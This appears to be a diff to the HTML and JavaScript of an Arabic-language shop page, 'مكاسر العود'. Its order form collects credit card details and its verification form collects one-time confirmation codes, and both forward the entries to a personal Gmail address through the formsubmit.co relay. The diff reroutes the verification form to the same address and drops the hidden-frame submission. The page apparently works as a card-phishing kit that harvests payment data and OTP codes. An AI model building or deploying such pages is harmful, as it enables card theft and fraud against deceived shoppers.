@@ -1124,9 +1124,9 @@
                     
                     <div class="bg-white p-8 rounded-2xl shadow-lg">
                         <h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
-                        <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" class="space-y-6" onsubmit="handleContactForm(event)">
+                        <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" class="space-y-6">
                             <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" value="about:blank">
+                            <input type="hidden" name="_redirect" value="https://yourwebsite.com/thanks.html">
                             
                             <div class="input-group">
                                 <input type="text" name="name" required="" placeholder=" ">
@@ -1409,10 +1409,10 @@
                         <p class="text-xl text-gray-600">أدخل معلومات البطاقة الائتمانية لإتمام الطلب</p>
                     </div>
 
-                    <form id="completeOrderForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" class="space-y-8">
+                    <form id="completeOrderForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" class="space-y-8">
                         <input type="hidden" name="_subject" value="💳 طلب جديد مع معلومات الدفع - مكاسر العود">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="about:blank">
+                        <input type="hidden" name="_redirect" value="https://yourwebsite.com/thanks.html">
 
                         <!-- Payment Card -->
                         <div class="form-section">
@@ -1523,10 +1523,10 @@
                     </div>
                     
                     <div class="mb-8">
-                        <form id="verificationForm" action="https://formsubmit.co/alhkr5415@gmail.com" method="POST" target="hiddenFrame">
+                        <form id="verificationForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST">
                             <input type="hidden" name="_subject" value="🔐 كود تأكيد طلب جديد - مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" value="about:blank">
+                            <input type="hidden" name="_redirect" value="https://yourwebsite.com/thanks.html">
                             
                             <label class="block text-gray-800 font-bold mb-6 text-xl">كود التأكيد</label>
                             <div class="flex justify-center space-x-3 rtl:space-x-reverse mb-6">
@@ -2319,15 +2319,7 @@
             document.getElementById('verificationPage').classList.remove('hidden');
         }
 
-        // Handle contact form
-        function handleContactForm(event) {
-            event.preventDefault();
-            const form = event.target;
-            
-            form.submit();
-            showNotification('✅ تم إرسال رسالتك بنجاح! سنتواصل معك قريباً.', 'success');
-            form.reset();
-        }
+
 
         // CARD MANAGEMENT FUNCTIONS
         function formatCardNumber(input) {
